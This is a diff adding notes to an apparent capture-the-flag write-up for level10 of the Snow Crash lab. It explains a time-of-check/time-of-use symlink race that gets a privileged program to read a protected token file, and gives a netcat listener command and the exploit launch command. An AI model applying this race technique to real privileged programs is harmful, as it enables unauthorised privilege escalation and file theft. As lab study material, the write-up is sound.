@@ -1,3 +1,20 @@
 For the network part, just listen with the command:
 
 nc -l -s 192.168.1.3 -p 6969
+
+Then send switch_link.c to <snow_crash_ip>/tmp and compile it.
+
+After that create a file /tmp/mdr with 'mdr' in it and create a soft link
+/tmp/lol that points to it. This passes the access() check.
+
+The switch progam will delete the link and recreate it to point to the file we
+want (~/token). Since there is some time that passes between the access call and
+the open, we can launch the two at the same time, and hopefully the datarace
+involved will work in our favor. Meaning that the access will be on the first
+link to the valid file, and then the open on the link to token.
+
+To do this, lauch this command:
+
+/tmp/a.out | ./level10 /tmp/lol 192.168.1.3 1>&2
+
+Then you should see the token :)
